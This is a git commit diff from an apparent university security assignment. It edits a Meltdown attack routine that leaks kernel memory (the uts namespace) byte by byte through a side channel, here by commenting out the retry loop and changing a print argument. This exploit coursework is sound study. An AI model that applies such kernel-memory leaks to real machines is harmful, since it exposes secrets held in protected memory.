af87c8fda5c12ca11a6b5acb9de529874c7f4588
Jia-Lin Shi <Jia-Lin.Shi@rub.de>
2024-02-28 20:08:01 +0100

    uts dfespair

--- assignment4/meltdown-template.c
+++ assignment4/meltdown-template.c
@@ -174,16 +174,16 @@ static void attack_init_uts_ns(){
     int leaked_val[1000];
     for (int i=0;i<1000;i++) leaked_val[i] = -1;
     
-    for(int j=0;j<10000;j++){
+    // for(int j=0;j<10000;j++){
         for (int i=0;i<1000;i++){
             if (leaked_val[i] == -1){
                 my_mfence();
                 leaked_val[i]=do_meltdown(target_adrs+i);
                 my_mfence();
-                if (leaked_val[i] != -1) printf("getting value %i at location %p and i %i, cur reps %i\n", leaked_val[i], target_adrs+i, i, j);
+                if (leaked_val[i] != -1) printf("getting value %i at location %p and i %i, cur reps %i\n", leaked_val[i], target_adrs+i, i, i);
             }  
         }
-    }
+    // }
 }
 
 #ifdef MELTDOWNCASE
